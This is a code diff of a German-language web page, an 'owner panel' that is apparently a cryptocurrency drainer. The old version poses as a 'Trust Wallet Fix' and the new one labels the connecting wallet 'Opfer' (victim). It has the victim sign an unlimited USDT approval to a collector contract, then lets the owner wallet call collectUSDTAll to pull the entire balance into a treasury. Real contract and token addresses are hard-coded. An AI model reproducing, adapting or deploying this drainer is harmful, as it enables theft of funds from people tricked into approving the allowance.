@@ -3,176 +3,105 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Owner Panel – Trust Wallet Fix</title>
+  <title>Owner Panel – BSC Collector</title>
   <style>
-    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:16px; }
-    .box{ background:#020617; padding:25px; border-radius:16px; width:420px; box-shadow:0 20px 50px rgba(0,0,0,.5); border: 1px solid #1e293b; }
-    h2{ margin-top:0; text-align: center; color: #f8fafc; }
-    .step { background: #1e293b; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
-    .step-title { font-weight: bold; font-size: 12px; color: #3b82f6; text-transform: uppercase; margin-bottom: 10px; }
-    select, button { width: 100%; padding: 12px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
-    select { background: #334155; color: white; margin-bottom: 10px; }
-    button { background:#22c55e; color: white; margin-top: 8px; }
-    button:hover { opacity: 0.9; }
-    button.secondary { background:#475569; }
-    button.warning { background: #f59e0b; }
-    .mono { font-family: monospace; font-size:11px; background: #000; padding: 6px; border-radius: 4px; display: block; color: #10b981; word-break: break-all; margin-top: 5px; }
-    #status { margin-top:15px; padding: 12px; border-radius: 8px; font-size: 13px; text-align: center; font-weight: 500; }
-    .status-info { background: rgba(59, 130, 246, 0.1); color: #60a5fa; }
-    .status-err { background: rgba(239, 68, 68, 0.2); color: #f87171; }
-    .status-ok { background: rgba(34, 197, 94, 0.2); color: #4ade80; }
+    body{ font-family: 'Segoe UI', Arial, sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; }
+    .box{ background:#020617; padding:25px; border-radius:16px; width:380px; box-shadow:0 10px 30px rgba(0,0,0,.5); border: 1px solid #1e293b; }
+    h2{ margin-top:0; color: #f8fafc; font-size: 20px; text-align: center; }
+    .step { background: #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
+    .step-title { font-size: 12px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 8px; }
+    button { background:#22c55e; border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:8px; color: white; transition: 0.2s; }
+    button:hover { background: #16a34a; }
+    button.secondary { background:#334155; margin-bottom: 8px; }
+    button.secondary:hover { background: #475569; }
+    button.danger { background: #ef4444; margin-top: 10px; }
+    .mono { font-family: monospace; font-size:11px; word-break:break-all; background: #000; padding: 5px; border-radius: 4px; display: block; margin-top: 5px; color: #10b981; }
+    #status { margin-top:15px; padding: 10px; border-radius: 6px; background: #1e293b; font-size: 13px; text-align: center; min-height: 20px; border: 1px dashed #334155; }
+    .info-text { font-size: 11px; color: #94a3b8; margin-top: 10px; line-height: 1.4; }
   </style>
 </head>
 <body>
 
 <div class="box">
-  <h2>Owner Panel Mobile</h2>
+  <h2>Admin Collector Panel</h2>
 
   <div class="step">
-    <div class="step-title">1. Token & Netzwerk</div>
-    <select id="tokenType" onchange="checkBalance()">
-      <option value="USDT">USDT (Tether)</option>
-      <option value="USDC">USDC (Circle)</option>
-    </select>
-    <div id="netInfo" style="font-size:10px; opacity:0.6;">Netzwerk: Prüfen...</div>
+    <div class="step-title">Phase 1: Wallet A (Opfer/Quelle)</div>
+    <button class="secondary" onclick="connectWalletA()">1. Wallet A verbinden</button>
+    <div class="mono" id="walletAAddress">Nicht verbunden</div>
+    <button style="margin-top:8px" onclick="approveUSDT()">2. USDT Freigabe (Approve)</button>
   </div>
 
-  <div class="step">
-    <div class="step-title">2. Quelle (Wallet A)</div>
-    <button class="secondary" onclick="connectA()">Wallet verbinden</button>
-    <span class="mono" id="addrA">Nicht verbunden</span>
-    <div id="balanceVal" style="font-size:12px; margin-top:5px; color:#34d399; font-weight:bold; display:none;">Guthaben: 0.00</div>
+  <div class="step" style="border-left-color: #eab308;">
+    <div class="step-title">Phase 2: Owner (Du)</div>
+    <p class="info-text">Jetzt in Metamask zur <b>Owner-Wallet</b> wechseln!</p>
+    <button class="danger" onclick="collectAll()">3. USDT komplett ziehen</button>
   </div>
 
-  <div class="step">
-    <div class="step-title">3. Berechtigung</div>
-    <button class="warning" onclick="approveToken()">Allowance freigeben</button>
-  </div>
+  <div id="status">Bereit...</div>
 
-  <div class="step" style="border-left-color: #22c55e;">
-    <div class="step-title">4. Transfer</div>
-    <button onclick="executeCollect()">Einzug starten</button>
+  <div class="info-text" style="text-align:center;">
+    Treasury: <span style="color: #60a5fa;">0x22Cc...95a7</span><br>
+    Contract: <span style="color: #60a5fa;">0x61bF...E26B</span>
   </div>
-
-  <div id="status" class="status-info">Warte auf Verbindung...</div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
 <script>
-  const COLLECTOR_ADDR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
-  const TOKEN_MAP = {
-    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-    USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
-  };
+  const COLLECTOR_ADDRESS = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
+  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 
-  const ERC20_ABI = [
-    "function approve(address spender, uint256 amount) public returns (bool)",
-    "function balanceOf(address account) public view returns (uint256)",
-    "function decimals() public view returns (uint8)"
-  ];
-  const COLLECTOR_ABI = ["function collectUSDTAll(address from) external"];
+  const collectorAbi = ["function collectUSDTAll(address from) external"];
+  const erc20Abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
 
   let walletA = null;
 
-  function log(msg, type='info') {
-    const s = document.getElementById("status");
-    s.innerText = msg;
-    s.className = "status-" + type;
-  }
+  function setStatus(msg) { document.getElementById("status").innerText = msg; }
 
-  async function checkNetwork() {
-    if (!window.ethereum) return;
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const net = await provider.getNetwork();
-    const info = document.getElementById("netInfo");
-    // Ethereum Mainnet ChainId ist 1
-    if (net.chainId === 1n) {
-      info.innerText = "Netzwerk: ✅ Ethereum Mainnet";
-      info.style.color = "#4ade80";
-    } else {
-      info.innerText = "Netzwerk: ⚠️ Falsches Netz (Bitte ETH wählen)";
-      info.style.color = "#f87171";
-    }
-  }
-
-  async function checkBalance() {
-    if(!walletA) return;
+  async function connectWalletA() {
     try {
+      if (!window.ethereum) return alert("Bitte Metamask installieren");
       const provider = new ethers.BrowserProvider(window.ethereum);
-      const symbol = document.getElementById("tokenType").value;
-      const contract = new ethers.Contract(TOKEN_MAP[symbol], ERC20_ABI, provider);
-      const bal = await contract.balanceOf(walletA);
-      const dec = await contract.decimals();
-      const formatted = ethers.formatUnits(bal, dec);
-      const display = document.getElementById("balanceVal");
-      display.innerText = "Guthaben: " + parseFloat(formatted).toFixed(2) + " " + symbol;
-      display.style.display = "block";
-    } catch(e) { console.error(e); }
+      const accounts = await provider.send("eth_requestAccounts", []);
+      walletA = accounts[0];
+      document.getElementById("walletAAddress").innerText = walletA;
+      setStatus("✅ Wallet A verbunden");
+    } catch (e) { setStatus("❌ Verbindung abgelehnt"); }
   }
 
-  async function connectA() {
-    if(!window.ethereum) {
-      log("❌ Bitte im Trust Wallet Browser öffnen", "err");
-      return;
-    }
+  async function approveUSDT() {
     try {
-      log("Verbindung wird angefragt...");
+      if (!walletA) return setStatus("❌ Zuerst Schritt 1");
       const provider = new ethers.BrowserProvider(window.ethereum);
-      
-      // Trust Wallet spezifischer Fix: Erzwingt das Popup
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      
       const signer = await provider.getSigner();
-      walletA = await signer.getAddress();
+      const contract = new ethers.Contract(USDT_ADDRESS, erc20Abi, signer);
       
-      document.getElementById("addrA").innerText = walletA;
-      await checkNetwork();
-      await checkBalance();
-      log("✅ Verbunden", "ok");
-    } catch(e) { 
+      setStatus("Bestätige Approve in Wallet A...");
+      const tx = await contract.approve(COLLECTOR_ADDRESS, ethers.MaxUint256);
+      await tx.wait();
+      setStatus("✅ Freigabe erteilt! Jetzt Wallet wechseln.");
+    } catch (e) { setStatus("❌ Approve fehlgeschlagen"); }
+  }
+
+  async function collectAll() {
+    try {
+      if (!walletA) return setStatus("❌ Wallet A Adresse fehlt");
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      
+      const contract = new ethers.Contract(COLLECTOR_ADDRESS, collectorAbi, signer);
+      setStatus("Sende Collect-Befehl...");
+      
+      const tx = await contract.collectUSDTAll(walletA);
+      setStatus("⌛ Transaktion läuft...");
+      await tx.wait();
+      
+      setStatus("🎉 Erfolg! USDT sind in der Treasury.");
+    } catch (e) {
       console.error(e);
-      log("❌ Verbindung fehlgeschlagen", "err"); 
+      setStatus("❌ Fehler: " + (e.reason || "Bist du der Owner?"));
     }
   }
-
-  async function approveToken() {
-    if(!walletA) return log("❌ Erst verbinden!", "err");
-    try {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const symbol = document.getElementById("tokenType").value;
-      const token = new ethers.Contract(TOKEN_MAP[symbol], ERC20_ABI, signer);
-      
-      log(`Freigabe für ${symbol} bestätigen...`);
-      const tx = await token.approve(COLLECTOR_ADDR, ethers.MaxUint256);
-      log("Warte auf Bestätigung...");
-      await tx.wait();
-      log("✅ Freigabe erfolgreich!", "ok");
-    } catch(e) { log("❌ Freigabe abgelehnt", "err"); }
-  }
-
-  async function executeCollect() {
-    if(!walletA) return log("❌ Keine Wallet", "err");
-    try {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const current = await signer.getAddress();
-      
-      if(current.toLowerCase() === walletA.toLowerCase()) {
-        return log("⚠️ Zu OWNER-Wallet wechseln!", "err");
-      }
-
-      const collector = new ethers.Contract(COLLECTOR_ADDR, COLLECTOR_ABI, signer);
-      log("Sende Transaktion...");
-      const tx = await collector.collectUSDTAll(walletA);
-      await tx.wait();
-      log("✅ Transfer erfolgreich!", "ok");
-      await checkBalance();
-    } catch(e) { log("❌ Fehler beim Transfer", "err"); }
-  }
-
-  // Initialer Check
-  if(window.ethereum) checkNetwork();
 </script>
 </body>
 </html>
